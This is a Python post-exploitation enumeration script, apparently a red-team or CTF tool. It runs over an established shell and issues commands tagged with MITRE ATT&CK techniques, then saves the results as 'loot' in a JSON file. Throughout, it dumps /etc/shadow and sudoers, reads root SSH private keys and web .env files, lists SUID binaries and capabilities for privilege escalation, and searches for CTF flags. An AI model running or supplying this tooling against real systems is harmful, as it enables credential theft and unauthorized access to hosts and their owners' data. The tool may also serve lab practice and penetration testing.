#!/usr/bin/env python3
"""
Morsmordre v4.0 - Red Engine
MITRE ATT&CK Framework Coverage
"""

import os
import sys
import json
import time
import select
from datetime import datetime

def log(msg, level="info"):
    colors = {"info": "\033[94m", "success": "\033[92m", "warning": "\033[93m", 
              "error": "\033[91m", "flag": "\033[93m\033[1m", "mitre": "\033[95m"}
    c = colors.get(level, "")
    sys.stderr.write(f"{c}[{level.upper()}] {msg}\033[0m\n")
    sys.stderr.flush()

def send(cmd, timeout=5):
    log(f"Running: {cmd}", "info")
    sys.stdout.write(cmd + "\n")
    sys.stdout.flush()
    
    output = []
    start = time.time()
    while time.time() - start < timeout:
        ready, _, _ = select.select([sys.stdin], [], [], 0.5)
        if ready:
            try:
                data = os.read(sys.stdin.fileno(), 8192).decode('utf-8', errors='ignore')
                if data:
                    output.append(data)
                    start = time.time()
            except:
                break
    return ''.join(output)

def main():
    target = os.environ.get('MORSMORDRE_TARGET', 'unknown')
    if target == "unknown":
        log("ERROR: Run via Sectumsempra!", "error")
        sys.exit(1)
    
    log(f"Morsmordre v4.0 - MITRE ATT&CK Mode", "mitre")
    log(f"Target: {target}", "info")
    time.sleep(2)
    
    loot = []
    flags = []
    
    # T1082 - System Information Discovery
    log("T1082 - System Information Discovery", "mitre")
    loot.append(("uname -a", send("uname -a"), "T1082"))
    loot.append(("hostname", send("hostname"), "T1082"))
    loot.append(("cat /etc/os-release", send("cat /etc/os-release 2>/dev/null"), "T1082"))
    loot.append(("lscpu", send("lscpu 2>/dev/null | head -20"), "T1082"))
    loot.append(("lsb_release -a", send("lsb_release -a 2>/dev/null"), "T1082"))
    
    # T1033 - System Owner/User Discovery
    log("T1033 - User Discovery", "mitre")
    loot.append(("whoami", send("whoami"), "T1033"))
    loot.append(("id", send("id"), "T1033"))
    loot.append(("groups", send("groups"), "T1033"))
    loot.append(("cat /etc/passwd", send("cat /etc/passwd"), "T1033"))
    loot.append(("cat /etc/group", send("cat /etc/group"), "T1033"))
    loot.append(("getent passwd", send("getent passwd"), "T1033"))
    loot.append(("last", send("last 2>/dev/null | head -10"), "T1033"))
    loot.append(("w", send("w 2>/dev/null"), "T1033"))
    
    # T1003 - OS Credential Dumping
    log("T1003 - Credential Dumping", "mitre")
    loot.append(("cat /etc/shadow", send("cat /etc/shadow 2>/dev/null"), "T1003"))
    loot.append(("cat /etc/master.passwd", send("cat /etc/master.passwd 2>/dev/null"), "T1003"))
    loot.append(("getent shadow", send("getent shadow 2>/dev/null | head -5"), "T1003"))
    
    # T1078 - Valid Accounts (sudo/sudoers)
    log("T1078 - Valid Accounts/Sudo", "mitre")
    loot.append(("sudo -l", send("sudo -l 2>/dev/null"), "T1078"))
    loot.append(("cat /etc/sudoers", send("cat /etc/sudoers 2>/dev/null"), "T1078"))
    loot.append(("cat /etc/sudoers.d/*", send("cat /etc/sudoers.d/* 2>/dev/null"), "T1078"))
    
    # T1548 - Abuse Elevation Control Mechanism (SUID/SGID)
    log("T1548 - SUID/SGID Binaries", "mitre")
    loot.append(("SUID files", send("find / -perm -4000 -type f 2>/dev/null"), "T1548"))
    loot.append(("SGID files", send("find / -perm -2000 -type f 2>/dev/null"), "T1548"))
    loot.append(("cap_get_file", send("getcap -r / 2>/dev/null"), "T1548"))
    
    # T1053 - Scheduled Task/Job (Cron)
    log("T1053 - Scheduled Tasks", "mitre")
    loot.append(("crontab -l", send("crontab -l 2>/dev/null"), "T1053"))
    loot.append(("cat /etc/crontab", send("cat /etc/crontab 2>/dev/null"), "T1053"))
    loot.append(("ls /etc/cron.d/", send("ls -la /etc/cron.d/ 2>/dev/null"), "T1053"))
    loot.append(("cat /etc/cron.d/*", send("cat /etc/cron.d/* 2>/dev/null"), "T1053"))
    loot.append(("systemctl list-timers", send("systemctl list-timers --all 2>/dev/null | head -20"), "T1053"))
    
    # T1049 - System Network Connections Discovery
    log("T1049 - Network Discovery", "mitre")
    loot.append(("netstat -tulpn", send("netstat -tulpn 2>/dev/null || ss -tulpn"), "T1049"))
    loot.append(("netstat -an", send("netstat -an 2>/dev/null || ss -an"), "T1049"))
    loot.append(("ip addr", send("ip addr 2>/dev/null || ifconfig"), "T1049"))
    loot.append(("ip route", send("ip route 2>/dev/null || route"), "T1049"))
    loot.append(("cat /etc/resolv.conf", send("cat /etc/resolv.conf"), "T1049"))
    loot.append(("cat /etc/hosts", send("cat /etc/hosts"), "T1049"))
    
    # T1057 - Process Discovery
    log("T1057 - Process Discovery", "mitre")
    loot.append(("ps aux", send("ps aux"), "T1057"))
    loot.append(("ps -ef", send("ps -ef"), "T1057"))
    loot.append(("top -bn1", send("top -bn1 2>/dev/null | head -30"), "T1057"))
    
    # T1083 - File and Directory Discovery
    log("T1083 - File Discovery", "mitre")
    loot.append(("ls -la /root", send("ls -la /root 2>/dev/null"), "T1083"))
    loot.append(("ls -la /home", send("ls -la /home"), "T1083"))
    loot.append(("find /home -type f -name '*.txt' 2>/dev/null | head -20", 
                 send("find /home -type f -name '*.txt' 2>/dev/null | head -20"), "T1083"))
    loot.append(("find /opt -type f 2>/dev/null | head -20", 
                 send("find /opt -type f 2>/dev/null | head -20"), "T1083"))
    
    # T1552 - Unsecured Credentials
    log("T1552 - Unsecured Credentials", "mitre")
    loot.append(("find / -name '*.ssh' -type d 2>/dev/null", 
                 send("find / -name '*.ssh' -type d 2>/dev/null"), "T1552"))
    loot.append(("cat /root/.ssh/id_rsa", send("cat /root/.ssh/id_rsa 2>/dev/null"), "T1552"))
    loot.append(("cat /root/.ssh/authorized_keys", send("cat /root/.ssh/authorized_keys 2>/dev/null"), "T1552"))
    loot.append(("find / -name 'id_rsa' 2>/dev/null", send("find / -name 'id_rsa' 2>/dev/null"), "T1552"))
    loot.append(("cat /var/www/html/.env", send("cat /var/www/html/.env 2>/dev/null"), "T1552"))
    loot.append(("cat /var/www/.env", send("cat /var/www/.env 2>/dev/null"), "T1552"))
    loot.append(("find /var/www -name 'config*' 2>/dev/null | head -10", 
                 send("find /var/www -name 'config*' 2>/dev/null | head -10"), "T1552"))
    
    # T1136 - Create Account (check for backdoors)
    log("T1136 - Account Discovery", "mitre")
    loot.append(("cat /etc/passwd | grep -E 'bash|sh'", 
                 send("cat /etc/passwd | grep -E 'bash|sh'"), "T1136"))
    loot.append(("awk -F: '$3 >= 1000 {print $1}' /etc/passwd", 
                 send("awk -F: '$3 >= 1000 {print $1}' /etc/passwd"), "T1136"))
    
    # T1036 - Masquerading (hidden files)
    log("T1036 - Hidden Files", "mitre")
    loot.append(("find / -name '.*' -type f 2>/dev/null | head -20", 
                 send("find / -name '.*' -type f 2>/dev/null | head -20"), "T1036"))
    loot.append(("ls -la /tmp", send("ls -la /tmp"), "T1036"))
    loot.append(("ls -la /var/tmp", send("ls -la /var/tmp"), "T1036"))
    loot.append(("ls -la /dev/shm", send("ls -la /dev/shm"), "T1036"))
    
    # FLAG HUNTING
    log("HUNTING CTF FLAGS...", "flag")
    flag_locations = [
        "/root/root.txt", "/root/flag.txt", "/root/flag",
        "/home/*/user.txt", "/home/*/flag.txt", "/home/*/flag",
        "/flag.txt", "/flag", "/opt/flag.txt", "/var/flag.txt",
        "/var/www/flag.txt", "/tmp/flag.txt", "/opt/flag",
        "/var/flag", "/home/flag.txt", "/user.txt"
    ]
    
    for loc in flag_locations:
        out = send(f"cat {loc} 2>/dev/null", 2)
        if out and "No such file" not in out and "Permission denied" not in out:
            clean = out.strip()
            if clean and len(clean) < 200:
                flags.append(f"{loc}: {clean}")
                log(f"FLAG FOUND: {clean[:80]}", "flag")
    
    # Search for flag patterns
    log("Searching for flag patterns...", "flag")
    patterns = ["HTB{", "THM{", "FLAG{", "CTF{", "flag{", "user{", "root{"]
    for pattern in patterns:
        out = send(f"grep -r '{pattern}' /home /opt /var/www 2>/dev/null | head -5", 3)
        if out:
            for line in out.strip().split('\n'):
                if line and pattern in line:
                    flags.append(line.strip())
                    log(f"PATTERN: {line.strip()[:80]}", "flag")
    
    # Save results
    filename = f"morsmordre_{target.replace('.', '_')}_{int(time.time())}.json"
    data = {
        "target": target,
        "timestamp": datetime.now().isoformat(),
        "mitre_coverage": [
            "T1082", "T1033", "T1003", "T1078", "T1548", 
            "T1053", "T1049", "T1057", "T1083", "T1552",
            "T1136", "T1036"
        ],
        "flags_found": flags,
        "loot": [{"command": cmd, "output": out[:500], "mitre": mitre} for cmd, out, mitre in loot]
    }
    
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)
    
    log(f"Saved: {filename}", "success")
    log(f"Total commands: {len(loot)}", "success")
    
    if flags:
        log("="*60, "flag")
        log("FLAGS CAPTURED:", "flag")
        for f in flags:
            log(f"  {f}", "flag")
        log("="*60, "flag")
    else:
        log("No flags found in standard locations", "warning")
        log("Check the JSON file for full enumeration data", "info")
    
    log("MITRE ATT&CK enumeration complete!", "success")

if __name__ == "__main__":
    main()
